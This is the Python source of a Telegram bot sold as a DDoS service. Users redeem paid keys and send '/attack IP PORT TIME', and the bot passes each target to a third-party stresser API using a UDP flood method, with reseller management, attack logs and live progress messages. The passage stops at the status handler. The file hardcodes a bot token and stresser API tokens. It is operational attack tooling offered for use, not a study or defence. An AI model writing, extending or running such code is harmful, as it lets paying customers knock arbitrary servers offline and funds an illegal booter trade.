#!/usr/bin/env python3
"""
˹𝚩𝖊𝐒𝖙𝐂𝖍𝐄𝖆𝐓 ✘ 𝙳𝐃𝙾𝚂 𝙾𝙉𝙄𝙓˼ ♪
Owner: 1987818347
"""

import telebot
from telebot.types import ReplyKeyboardMarkup
import threading
import os
import re
import sys
import json
import random
import string
from datetime import datetime, timedelta
import time
import requests

sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

BOT_START_TIME = datetime.now()

# ============= CONFIG =============
BOT_TOKEN = os.environ.get('BOT_TOKEN', "8771905727:AAHgWlvO3Jx6po3OVD5f4QHt-_C3tJDm0JY")
BOT_OWNER = 1987818347
BOT_NAME = "˹𝚩𝖊𝐒𝖙𝐂𝖍𝐄𝖆𝐓 ✘ 𝙳𝐃𝙾𝚂 𝙾𝙉𝙸𝚇˼ ♪"

DEFAULT_API_URL = "https://stresser.works/api/start"
DEFAULT_API_TOKEN = "a05d4ed492744534ab9307b8d9930c2f6a3a8ffa6eea85d07825ec150215747a"
DEFAULT_API_METHOD = "UDP-BIG"
DEFAULT_API_GEOLOCATION = "ALL"

DATA_FILE = "bot_data.json"

# ============= DATA =============
def load_data():
    default = {
        "users": {}, "keys": {}, "resellers": {},
        "admins": {str(BOT_OWNER): {"added_at": datetime.now().isoformat()}},
        "approved_groups": {}, "attack_logs": [], "admin_logs": [],
        "banned_users": {}, "feedbacks": [],
        "stickers": [], "videos": [], "pyf_videos": [],
        "settings": {
            "max_attack_time": 300,
            "user_cooldown": 5,
            "maintenance_mode": False,
            "maintenance_msg": "Bot under maintenance.",
            "api_url": DEFAULT_API_URL,
            "api_token": DEFAULT_API_TOKEN,
            "api_method": DEFAULT_API_METHOD,
            "api_geolocation": DEFAULT_API_GEOLOCATION,
        }
    }
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                d = json.load(f)
                if isinstance(d, dict):
                    for k, v in default.items():
                        d.setdefault(k, v)
                    for sk, sv in default["settings"].items():
                        d["settings"].setdefault(sk, sv)
                    if d["settings"].get("api_token") in [
                        "c9b483cfafaa99e8f8800d197df24ccc73b9498398b5301c890cc12cb5e39563",
                        "", None
                    ]:
                        d["settings"]["api_token"] = DEFAULT_API_TOKEN
                        d["settings"]["api_url"] = DEFAULT_API_URL
                    return d
        except: pass
    return default

def save_data(d):
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(d, f, indent=2, default=str)
    except: pass

data = load_data()
save_data(data)
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

# ============= RANDOM ROTATION =============
_sticker_pool = []
_video_pool = []
_pyf_pool = []

def get_random_sticker():
    global _sticker_pool
    stickers = data.get("stickers", [])
    if not stickers: return None
    if not _sticker_pool:
        _sticker_pool = stickers.copy()
        random.shuffle(_sticker_pool)
    return _sticker_pool.pop()

def get_random_video():
    global _video_pool
    videos = data.get("videos", [])
    if not videos: return None
    if not _video_pool:
        _video_pool = videos.copy()
        random.shuffle(_video_pool)
    return _video_pool.pop()

def get_random_pyf():
    global _pyf_pool
    pyfs = data.get("pyf_videos", [])
    if not pyfs: return None
    if not _pyf_pool:
        _pyf_pool = pyfs.copy()
        random.shuffle(_pyf_pool)
    return _pyf_pool.pop()

# ============= HELPERS =============
def is_owner(uid): return uid == BOT_OWNER or str(uid) in data["admins"]
def is_reseller(uid):
    r = data["resellers"].get(str(uid))
    return r is not None and not r.get('blocked', False)
def is_banned(uid): return str(uid) in data["banned_users"]
def get_setting(k, d=None): return data["settings"].get(k, d)
def set_setting(k, v):
    data["settings"][k] = v
    save_data(data)

def gen_key(length=16):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def fmt_key(k):
    return '-'.join([k[i:i+4] for i in range(0, len(k), 4)])

def has_valid_key(uid):
    if is_owner(uid) or is_reseller(uid): return True
    u = data["users"].get(str(uid))
    if not u or not u.get('key_expiry'): return False
    try: return datetime.now() <= datetime.fromisoformat(u['key_expiry'])
    except: return False

def get_ist_now():
    return datetime.now() + timedelta(hours=5, minutes=30)

def ist_time_str(dt=None):
    if dt is None: dt = datetime.now()
    ist = dt + timedelta(hours=5, minutes=30)
    return ist.strftime('%I:%M:%S %p')

def ist_full_str(dt=None):
    if dt is None: dt = datetime.now()
    ist = dt + timedelta(hours=5, minutes=30)
    return ist.strftime('%d %b %Y, %I:%M:%S %p')

def time_remaining(uid):
    if is_owner(uid): return "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ (ᴏᴡɴᴇʀ)"
    if is_reseller(uid): return "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ (ʀᴇꜱᴇʟʟᴇʀ)"
    u = data["users"].get(str(uid))
    if not u or not u.get('key_expiry'): return "❌ ɴᴏ ᴋᴇʏ"
    try:
        rem = datetime.fromisoformat(u['key_expiry']) - datetime.now()
        total = int(rem.total_seconds())
        if total <= 0: return "❌ ᴇxᴘɪʀᴇᴅ"
        d = total // 86400
        h = (total % 86400) // 3600
        m = (total % 3600) // 60
        s = total % 60
        parts = []
        if d > 0: parts.append(f"{d}ᴅ")
        if h > 0: parts.append(f"{h}ʜ")
        if m > 0: parts.append(f"{m}ᴍ")
        parts.append(f"{s}ꜱ")
        return " ".join(parts)
    except: return "❌ ᴇʀʀᴏʀ"

def time_remaining_long(uid):
    if is_owner(uid): return "  ┗ ♾️ ᴜɴʟɪᴍɪᴛᴇᴅ (ᴏᴡɴᴇʀ)"
    if is_reseller(uid): return "  ┗ ♾️ ᴜɴʟɪᴍɪᴛᴇᴅ (ʀᴇꜱᴇʟʟᴇʀ)"
    u = data["users"].get(str(uid))
    if not u or not u.get('key_expiry'): return "  ┗ ❌ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ"
    try:
        rem = datetime.fromisoformat(u['key_expiry']) - datetime.now()
        total = int(rem.total_seconds())
        if total <= 0: return "  ┗ ❌ ᴇxᴘɪʀᴇᴅ"
        d = total // 86400
        h = (total % 86400) // 3600
        m = (total % 3600) // 60
        s = total % 60
        lines = []
        if d > 0: lines.append(f"  ┣ 📅 ᴅᴀʏꜱ ➪ <b>{d}</b>")
        if h > 0: lines.append(f"  ┣ 🕐 ʜᴏᴜʀꜱ ➪ <b>{h}</b>")
        if m > 0: lines.append(f"  ┣ ⏱️ ᴍɪɴᴜᴛᴇꜱ ➪ <b>{m}</b>")
        lines.append(f"  ┗ ⚡ ꜱᴇᴄᴏɴᴅꜱ ➪ <b>{s}</b>")
        return "\n".join(lines)
    except: return "  ┗ ❌ ᴇʀʀᴏʀ"

def escape_html(text):
    if text is None:
        return "N/A"
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

user_cooldown = {}
attack_lock = threading.Lock()
active_attacks = {}

def get_cd_remaining(uid):
    if uid in user_cooldown:
        r = user_cooldown[uid] - time.time()
        if r > 0: return int(r)
        del user_cooldown[uid]
    return 0

def set_cd(uid):
    cd = get_setting('user_cooldown', 5)
    if cd > 0: user_cooldown[uid] = time.time() + cd

def is_attack_running():
    with attack_lock:
        now = datetime.now()
        for aid, atk in list(active_attacks.items()):
            if atk['end_time'] <= now: del active_attacks[aid]
        return len(active_attacks) > 0

# ============= BAN CHECK =============
def check_ban(msg):
    uid = msg.from_user.id
    if is_banned(uid):
        try:
            ban_info = data["banned_users"].get(str(uid), {})
            if isinstance(ban_info, dict):
                reason = ban_info.get("reason", "ᴠɪᴏʟᴀᴛɪᴏɴ ᴏꜰ ᴛᴇʀᴍꜱ")
                banned_at = ban_info.get("banned_at", "N/A")
                try:
                    dt = datetime.fromisoformat(banned_at)
                    banned_at = dt.strftime("%d %b %Y %H:%M")
                except: pass
            else:
                reason = "ᴠɪᴏʟᴀᴛɪᴏɴ ᴏꜰ ᴛᴇʀᴍꜱ"
                banned_at = "N/A"
            
            ban_msg = (
                "╔══════════════════════════════╗\n"
                "║   🚫 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 🚫   ║\n"
                "╚══════════════════════════════╝\n\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃   ⛔ 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗 ⛔\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                "🔒 <b>ᴀᴀᴘᴋᴏ ɪꜱ ʙᴏᴛ ꜱᴇ ʙᴀɴ ᴋᴀʀ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ</b>\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🆔 <b>ʏᴏᴜʀ ɪᴅ:</b> <code>{uid}</code>\n"
                f"📅 <b>ʙᴀɴɴᴇᴅ ᴀᴛ:</b> <code>{banned_at}</code>\n"
                f"📝 <b>ʀᴇᴀꜱᴏɴ:</b> <i>{escape_html(reason)}</i>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "⚠️ <b>ᴀᴀᴘ ʙᴏᴛ ᴋᴀ ᴋᴏɪ ʙʜɪ ꜰᴇᴀᴛᴜʀᴇ ᴜꜱᴇ ɴᴀʜɪ ᴋᴀʀ ꜱᴀᴋᴛᴇ</b>\n\n"
                "💬 <b>ᴜɴʙᴀɴ ᴋᴇ ʟɪʏᴇ ᴏᴡɴᴇʀ ꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴋᴀʀᴏ</b>\n"
                f"👑 <b>ᴏᴡɴᴇʀ ɪᴅ:</b> <code>{BOT_OWNER}</code>\n\n"
                "╔══════════════════════════════╗\n"
                "║   🔒 𝗔𝗖𝗖𝗘𝗦𝗦 𝗕𝗟𝗢𝗖𝗞𝗘𝗗 🔒   ║\n"
                "╚══════════════════════════════╝"
            )
            bot.reply_to(msg, ban_msg, parse_mode="HTML")
        except Exception as e:
            print(f"Ban msg error: {e}")
        return True
    return False

# ============= API =============
def api_attack(ip, port, dur):
    try:
        url = get_setting("api_url", DEFAULT_API_URL)
        token = get_setting("api_token", DEFAULT_API_TOKEN)
        method = get_setting("api_method", DEFAULT_API_METHOD)
        geo = get_setting("api_geolocation", DEFAULT_API_GEOLOCATION)
        req = f"{url}?token={token}&host={ip}&port={port}&time={dur}&method={method}&geolocation={geo}"
        print(f"🎯 API Request: {req}")
        resp = requests.get(req, timeout=10)
        print(f"📡 API Response: {resp.status_code} - {resp.text[:200]}")
        if resp.status_code == 200: return True, resp.text
        return False, f"HTTP {resp.status_code}: {resp.text[:200]}"
    except Exception as e:
        print(f"⚠️ API Error: {e}")
        return False, str(e)

# ============= KEYBOARDS =============
def kb_main(uid):
    m = ReplyKeyboardMarkup(resize_keyboard=True)
    if is_owner(uid):
        m.row("🔥 𝐀𝐓𝐓𝐀𝐂𝐊", "📊 𝐒𝐓𝐀𝐓𝐔𝐒")
        m.row("👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄", "👑 𝐎𝐖𝐍𝐄𝐑 𝐏𝐀𝐍𝐄𝐋")
    elif is_reseller(uid) or has_valid_key(uid):
        m.row("🔥 𝐀𝐓𝐓𝐀𝐂𝐊", "📊 𝐒𝐓𝐀𝐓𝐔𝐒")
        m.row("🔑 𝐑𝐄𝐃𝐄𝐄𝐌", "👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄")
    else:
        m.row("🔑 𝐑𝐄𝐃𝐄𝐄𝐌", "👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄")
    return m

def kb_owner():
    m = ReplyKeyboardMarkup(resize_keyboard=True)
    m.row("🔑 𝐆𝐄𝐍 𝐊𝐄𝐘", "👥 𝐔𝐒𝐄𝐑𝐒")
    m.row("📊 𝐒𝐓𝐀𝐓𝐒", "📢 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓")
    m.row("⚙️ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒", "❌ 𝐂𝐋𝐎𝐒𝐄")
    return m

# ============= START =============
@bot.message_handler(commands=['start', 'help'])
def cmd_start(msg):
    if check_ban(msg): return
    uid = msg.from_user.id
    name = msg.from_user.first_name or "User"
    username = msg.from_user.username
    cid = msg.chat.id

    check_text = (
        "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
        "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
        "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
        "▱▱▱▱▱▱▱▱▱▱ 0%\n"
        "⏳ 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠..."
    )

    check = None
    chosen_pyf_start = get_random_pyf()
    if chosen_pyf_start:
        try:
            check = bot.send_video(cid, chosen_pyf_start, caption=check_text, parse_mode="HTML")
        except:
            check = bot.send_message(cid, check_text, parse_mode="HTML")
    else:
        check = bot.send_message(cid, check_text, parse_mode="HTML")

    steps = [
        ("▰▱▱▱▱▱▱▱▱▱", "10%", "📡 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗻𝗴 𝘁𝗼 𝘀𝗲𝗿𝘃𝗲𝗿..."),
        ("▰▰▰▱▱▱▱▱▱▱", "30%", "👤 𝐕𝐞𝐫𝐢𝐟𝐲𝐢𝐧𝐠 𝐮𝐬𝐞𝐫..."),
        ("▰▰▰▰▰▱▱▱▱▱", "50%", "⚙️ 𝙇𝙤𝙖𝙙𝙞𝙣𝙜 𝙥𝙧𝙤𝙛𝙞𝙡𝙚..."),
        ("▰▰▰▰▰▰▰▱▱▱", "70%", "🔑 ᴄʜᴇᴄᴋɪɴɢ ᴋᴇʏ ꜱᴛᴀᴛᴜꜱ..."),
        ("▰▰▰▰▰▰▰▰▰▱", "90%", "⏳ 𝘍𝘪𝘯𝘢𝘭𝘪𝘻𝘪𝘯𝘨..."),
        ("▰▰▰▰▰▰▰▰▰▰", "100%", "✅ Ｖｅｒｉｆｉｅｄ!"),
    ]

    for bar, pct, status in steps:
        time.sleep(0.4)
        try:
            bot.edit_message_caption(
                chat_id=cid, message_id=check.message_id,
                caption=(
                    "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
                    "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
                    "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
                    f"{bar} {pct}\n{status}"
                ),
                parse_mode="HTML"
            )
        except:
            try:
                bot.edit_message_text(
                    chat_id=cid, message_id=check.message_id,
                    text=(
                        "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
                        "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
                        "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
                        f"{bar} {pct}\n{status}"
                    ),
                    parse_mode="HTML"
                )
            except: pass

    is_new = str(uid) not in data["users"]
    if is_new:
        data["users"][str(uid)] = {
            "username": username or name,
            "joined_at": datetime.now().isoformat(),
            "total_attacks": 0,
            "key_expiry": None
        }
        save_data(data)

    has_key = has_valid_key(uid)
    time_left = time_remaining(uid)

    try: bot.delete_message(cid, check.message_id)
    except: pass

    sticker_msg = None
    chosen_sticker = get_random_sticker()
    if chosen_sticker:
        try:
            sticker_msg = bot.send_sticker(cid, chosen_sticker)
        except Exception as e:
            print(f"Sticker Error: {e}")

    header = (
        "〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n"
        f"┊         {BOT_NAME}              ┊\n"
        "〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n"
    )

    if is_new and not has_key:
        text = header + (
            f"\n👋 <b>ᴡᴇʟᴄᴏᴍᴇ, {escape_html(name)}!</b>\n\n"
            "🎉 ᴀᴀᴘᴋᴀ ᴀᴄᴄᴏᴜɴᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄʀᴇᴀᴛᴇ ʜᴏ ɢᴀʏᴀ!\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "❌ <b>ꜱᴛᴀᴛᴜꜱ:</b> ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ\n"
            f"🎯 <b>ᴍᴇᴛʜᴏᴅ:</b> <code>{escape_html(get_setting('api_method', 'UDP-BIG'))}</code>\n"
            "⚡ <b>ʙᴏᴛ:</b> 🟢 ᴏɴʟɪɴᴇ\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📌 <b>ᴋᴀɪꜱᴇ ꜱᴛᴀʀᴛ ᴋᴀʀᴇ?</b>\n\n"
            "1️⃣ <b>ʀᴇᴅᴇᴇᴍ ᴋᴇʏ</b> ➤ <code>/redeem YOUR-KEY</code>\n"
            "2️⃣ <b>ʟᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ</b> ➤ <code>/attack IP PORT TIME</code>\n"
            "3️⃣ <b>ᴄʜᴇᴄᴋ ᴘʀᴏꜰɪʟᴇ</b> ➤ <code>/profile</code>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ <b>ʙɪɴᴀ ᴋᴇʏ ᴋᴇ ᴀᴛᴛᴀᴄᴋ ɴᴀʜɪ ʟᴀɢᴇɢᴀ!</b>\n"
            "🔑 ᴋᴇʏ ʟᴇɴᴇ ᴋᴇ ʟɪʏᴇ ᴏᴡɴᴇʀ ꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴋᴀʀᴏ.\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "👇 <b>ɴᴇᴇᴄʜᴇ ʙᴜᴛᴛᴏɴꜱ ꜱᴇ ꜱᴛᴀʀᴛ ᴋᴀʀᴏ</b>"
        )
    elif has_key:
        u = data["users"].get(str(uid), {})
        total_attacks = u.get("total_attacks", 0)
        role = "👑 ᴏᴡɴᴇʀ" if is_owner(uid) else ("💼 ʀᴇꜱᴇʟʟᴇʀ" if is_reseller(uid) else "👤 ᴜꜱᴇʀ")
        text = header + (
            f"\n👋 <b>ᴡᴇʟᴄᴏᴍᴇ ʙᴀᴄᴋ, {escape_html(name)}!</b>\n\n"
            "✅ <b>ᴋᴇʏ ᴠᴇʀɪꜰɪᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>ʀᴏʟᴇ:</b> {role}\n"
            f"🆔 <b>ɪᴅ:</b> <code>{uid}</code>\n"
            f"⏰ <b>ᴛɪᴍᴇ ʟᴇꜰᴛ:</b> <b>{time_left}</b>\n"
            f"🎯 <b>ᴛᴏᴛᴀʟ ᴀᴛᴛᴀᴄᴋꜱ:</b> {total_attacks}\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔥 <b>ʀᴇᴀᴅʏ ᴛᴏ ʟᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ?</b>"
        )
    else:
        text = header + (
            f"\n👋 <b>ᴡᴇʟᴄᴏᴍᴇ ʙᴀᴄᴋ, {escape_html(name)}!</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "❌ <b>ꜱᴛᴀᴛᴜꜱ:</b> ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ\n"
            f"🎯 <b>ᴍᴇᴛʜᴏᴅ:</b> <code>{escape_html(get_setting('api_method', 'UDP-BIG'))}</code>\n"
            "⚡ <b>ʙᴏᴛ:</b> 🟢 ᴏɴʟɪɴᴇ\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ <b>ᴀᴀᴘᴋɪ ᴋᴇʏ ᴇxᴘɪʀᴇ ʜᴏ ɢᴀʏɪ ʜᴀɪ</b>\n\n"
            "📌 <b>ᴋᴇʏ ʀᴇᴅᴇᴇᴍ ᴋᴀʀᴏ:</b>\n"
            "➤ <code>/redeem YOUR-KEY</code>\n\n"
            "🔑 ɴᴀʏᴀ ᴋᴇʏ ʟᴇɴᴇ ᴋᴇ ʟɪʏᴇ ᴏᴡɴᴇʀ ꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴋᴀʀᴏ.\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "👇 <b>ɴᴇᴇᴄʜᴇ ʙᴜᴛᴛᴏɴꜱ ꜱᴇ ꜱᴛᴀʀᴛ ᴋᴀʀᴏ</b>"
        )

    bot.send_message(cid, text, reply_markup=kb_main(uid), parse_mode="HTML")

    if sticker_msg:
        def delete_sticker():
            time.sleep(1)
            try: bot.delete_message(cid, sticker_msg.message_id)
            except: pass
        threading.Thread(target=delete_sticker, daemon=True).start()

# ============= ATTACK WITH LIVE AUTO-UPDATE =============
@bot.message_handler(commands=['attack'])
def cmd_attack(msg):
    if check_ban(msg): return
    uid = msg.from_user.id
    cid = msg.chat.id

    if get_setting('maintenance_mode', False) and not is_owner(uid):
        bot.reply_to(msg, f"🔧 {get_setting('maintenance_msg', 'Maintenance')}"); return

    if not is_owner(uid) and not has_valid_key(uid):
        bot.reply_to(msg, "⚠️ <b>ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ!</b> /redeem ꜰɪʀꜱᴛ.", parse_mode="HTML"); return

    parts = msg.text.split()[1:]
    if len(parts) != 3:
        bot.reply_to(msg,
            "❌ <b>ᴜꜱᴀɢᴇ:</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "📌 <code>/attack IP PORT TIME</code>\n\n"
            "📝 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
            "<code>/attack 1.2.3.4 80 60</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━",
            parse_mode="HTML")
        return

    ip, ps, ds = parts
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        bot.reply_to(msg, "❌ <b>ɪɴᴠᴀʟɪᴅ ɪᴘ!</b>", parse_mode="HTML"); return

    try:
        port = int(ps); dur = int(ds)
        if not (1 <= port <= 65535): bot.reply_to(msg, "❌ ᴘᴏʀᴛ 1-65535!"); return
        if dur < 1: bot.reply_to(msg, "❌ ᴍɪɴ 1ꜱ!"); return
        if dur > get_setting('max_attack_time', 300) and not is_owner(uid):
            bot.reply_to(msg, f"❌ ᴍᴀx {get_setting('max_attack_time', 300)}ꜱ!"); return
    except:
        bot.reply_to(msg, "❌ ɪɴᴠᴀʟɪᴅ ᴘᴏʀᴛ/ᴛɪᴍᴇ!"); return

    cd = get_cd_remaining(uid)
    if cd > 0 and not is_owner(uid):
        bot.reply_to(msg, f"⏸️ ᴄᴏᴏʟᴅᴏᴡɴ: {cd}ꜱ"); return

    if is_attack_running():
        bot.reply_to(msg, "❌ ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ!"); return

    set_cd(uid)
    name = msg.from_user.username or f"User_{uid}"

    ok, r = api_attack(ip, port, dur)
    if not ok:
        bot.reply_to(msg, f"❌ <b>ꜰᴀɪʟᴇᴅ</b>\n<code>{escape_html(r[:300])}</code>", parse_mode="HTML"); return

    start_time = datetime.now()
    end_time = start_time + timedelta(seconds=dur)

    def build_attack_caption():
        now = datetime.now()
        elapsed = int((now - start_time).total_seconds())
        rem = max(0, dur - elapsed)
        pct = min(100, int((elapsed / dur) * 100)) if dur > 0 else 0
        filled = int(pct / 10)
        bar = "▰" * filled + "▱" * (10 - filled)

        if pct < 20: st = "🔴 ᴊᴜꜱᴛ ꜱᴛᴀʀᴛᴇᴅ"
        elif pct < 50: st = "🟠 ɪɴ ᴘʀᴏɢʀᴇꜱꜱ"
        elif pct < 80: st = "🟡 ᴍᴏʀᴇ ᴛʜᴀɴ ʜᴀʟꜰ"
        elif pct < 100: st = "🟢 ᴀʟᴍᴏꜱᴛ ᴅᴏɴᴇ"
        else: st = "✅ ᴄᴏᴍᴘʟᴇᴛᴇ"

        rem_m = rem // 60
        rem_s = rem % 60

        return (
            "╔══════════════════════════════╗\n"
            "║   💀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗 💀   ║\n"
            "╚══════════════════════════════╝\n\n"
            f"{bar} {pct}%\n"
            f"{st}\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚔️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┣ 👤 ᴜꜱᴇʀ ➪ <b>@{escape_html(name)}</b>\n"
            f"┣ 🎯 ᴛᴀʀɢᴇᴛ ➪ <code>{ip}:{port}</code>\n"
            f"┣ ⏱️ ᴅᴜʀᴀᴛɪᴏɴ ➪ <b>{dur}ꜱ</b>\n"
            f"┣ 🚀 ᴍᴇᴛʜᴏᴅ ➪ <b>{escape_html(get_setting('api_method', 'UDP-BIG'))}</b>\n"
            f"┗ 🌍 ɢᴇᴏ ➪ <code>{escape_html(get_setting('api_geolocation', 'ALL'))}</code>\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⏰ 𝗧𝗜𝗠𝗘 𝗧𝗥𝗔𝗖𝗞𝗜𝗡𝗚\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┣ ▶️ ꜱᴛᴀʀᴛ ➪ <code>{ist_time_str(start_time)} IST</code>\n"
            f"┣ ⏹️ ᴇɴᴅ ➪ <code>{ist_time_str(end_time)} IST</code>\n"
            f"┣ ⏳ ᴇʟᴀᴘꜱᴇᴅ ➪ <b>{elapsed}ꜱ</b>\n"
            f"┗ ⏱️ ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{rem_m}ᴍ {rem_s}ꜱ</b>\n\n"
            "╔══════════════════════════════╗\n"
            "║   🔥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 🔥   ║\n"
            "╚══════════════════════════════╝"
        )

    chosen_video = get_random_video()
    attack_msg = None
    is_video = False

    if chosen_video:
        try:
            attack_msg = bot.send_video(cid, chosen_video, caption=build_attack_caption(), parse_mode="HTML")
            is_video = True
        except:
            attack_msg = bot.reply_to(msg, build_attack_caption(), parse_mode="HTML")
    else:
        attack_msg = bot.reply_to(msg, build_attack_caption(), parse_mode="HTML")

    data["attack_logs"].append({
        'user_id': uid, 'username': name, 'target': ip, 'port': port,
        'duration': dur, 'timestamp': datetime.now().isoformat()
    })
    if str(uid) in data["users"]:
        data["users"][str(uid)]["total_attacks"] = data["users"][str(uid)].get("total_attacks", 0) + 1
    save_data(data)

    aid = f"{uid}_{time.time()}"
    with attack_lock:
        active_attacks[aid] = {
            'target': ip, 'port': port, 'duration': dur,
            'user_id': uid, 'username': name,
            'end_time': end_time,
            'start_time': start_time
        }

    # Auto-update attack message every 3 seconds
    def auto_update_attack():
        last_text = None
        for _ in range(dur // 3 + 5):
            time.sleep(3)
            now = datetime.now()
            if now >= end_time:
                break
            try:
                new_text = build_attack_caption()
                if new_text != last_text:
                    try:
                        if is_video:
                            bot.edit_message_caption(
                                chat_id=cid,
                                message_id=attack_msg.message_id,
                                caption=new_text,
                                parse_mode="HTML"
                            )
                        else:
                            bot.edit_message_text(
                                chat_id=cid,
                                message_id=attack_msg.message_id,
                                text=new_text,
                                parse_mode="HTML"
                            )
                        last_text = new_text
                    except Exception as e:
                        err = str(e)
                        if "message is not modified" in err.lower(): continue
                        if "Too Many Requests" in err or "retry after" in err.lower():
                            time.sleep(5); continue
            except: pass

    threading.Thread(target=auto_update_attack, daemon=True).start()

    def done():
        time.sleep(dur)
        with attack_lock: active_attacks.pop(aid, None)
        complete_caption = (
            "╔══════════════════════════════╗\n"
            "║   ✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 ✅   ║\n"
            "╚══════════════════════════════╝\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📊 𝗙𝗜𝗡𝗔𝗟 𝗥𝗘𝗣𝗢𝗥𝗧\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┣ 👤 ᴜꜱᴇʀ ➪ <b>@{escape_html(name)}</b>\n"
            f"┣ 🎯 ᴛᴀʀɢᴇᴛ ➪ <code>{ip}:{port}</code>\n"
            f"┣ ⏱️ ᴅᴜʀᴀᴛɪᴏɴ ➪ <b>{dur}ꜱ</b>\n"
            f"┣ ▶️ ꜱᴛᴀʀᴛ ➪ <code>{ist_time_str(start_time)} IST</code>\n"
            f"┗ ⏹️ ᴇɴᴅ ➪ <code>{ist_time_str(end_time)} IST</code>\n\n"
            "╔══════════════════════════════╗\n"
            "║   🔥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗢𝗡𝗘 🔥   ║\n"
            "╚══════════════════════════════╝"
        )
        try:
            if is_video:
                bot.edit_message_caption(
                    chat_id=cid, message_id=attack_msg.message_id,
                    caption=complete_caption, parse_mode="HTML"
                )
            else:
                bot.edit_message_text(
                    chat_id=cid, message_id=attack_msg.message_id,
                    text=complete_caption, parse_mode="HTML"
                )
        except:
            try: bot.send_message(cid, complete_caption, parse_mode="HTML")
            except: pass

    threading.Thread(target=done, daemon=True).start()

# ============= LIVE STATUS =============
@bot.message_handler(commands=['status'])
